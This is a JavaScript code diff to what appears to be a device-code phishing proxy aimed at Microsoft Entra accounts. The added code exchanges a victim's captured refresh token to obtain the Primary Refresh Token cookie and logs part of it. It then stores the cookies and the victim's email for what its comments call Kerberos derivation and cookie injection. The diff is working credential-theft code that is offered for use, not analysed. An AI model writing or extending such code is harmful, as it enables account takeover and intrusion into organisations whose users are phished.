@@ -197,6 +197,58 @@ async function pollForToken(jobId) {
           }
         }
 
+        // Device code flow doesn't return x-ms-RefreshTokenCredential cookie.
+        // Do a refresh token exchange to capture the PRT cookie.
+        // This is required for Kerberos derivation and cookie injection.
+        if (tokenData.refresh_token) {
+          try {
+            const refreshResponse = await ms.post(
+              `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
+              new URLSearchParams({
+                grant_type: 'refresh_token',
+                client_id: clientId,
+                refresh_token: tokenData.refresh_token,
+                scope: 'openid profile offline_access'
+              }),
+              {
+                headers: {
+                  'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                validateStatus: () => true,
+                timeout: 15000,
+                proxy: job.proxy,
+              }
+            );
+
+            // Capture PRT cookie from refresh token exchange
+            const refreshSetCookies = refreshResponse.headers['set-cookie'] || [];
+            for (const cookieStr of refreshSetCookies) {
+              const cookieParts = cookieStr.split(';')[0].trim();
+              const eqIndex = cookieParts.indexOf('=');
+              if (eqIndex > 0) {
+                const cookieName = cookieParts.substring(0, eqIndex).trim();
+                const cookieValue = cookieParts.substring(eqIndex + 1).trim();
+                if (cookieName === 'x-ms-RefreshTokenCredential' && cookieValue) {
+                  // Add PRT cookie to responseCookies
+                  responseCookies.push({
+                    name: cookieName,
+                    value: cookieValue,
+                    domain: '.login.microsoftonline.com'
+                  });
+                  console.log('[DeviceProxy] PRT cookie captured from refresh token exchange: prefix=' + cookieValue.substring(0, 30) + '... length=' + cookieValue.length);
+                }
+              }
+            }
+
+            // If refresh token exchange returned a new refresh token, update tokenData
+            if (refreshResponse.data && refreshResponse.data.refresh_token) {
+              tokenData.refresh_token = refreshResponse.data.refresh_token;
+            }
+          } catch (e) {
+            console.log('[DeviceProxy] Refresh token exchange for PRT failed:', e.message);
+          }
+        }
+
         // Store cookies and email in job for later storage
         job.captured_cookies = responseCookies;
         job.captured_email = capturedEmail;
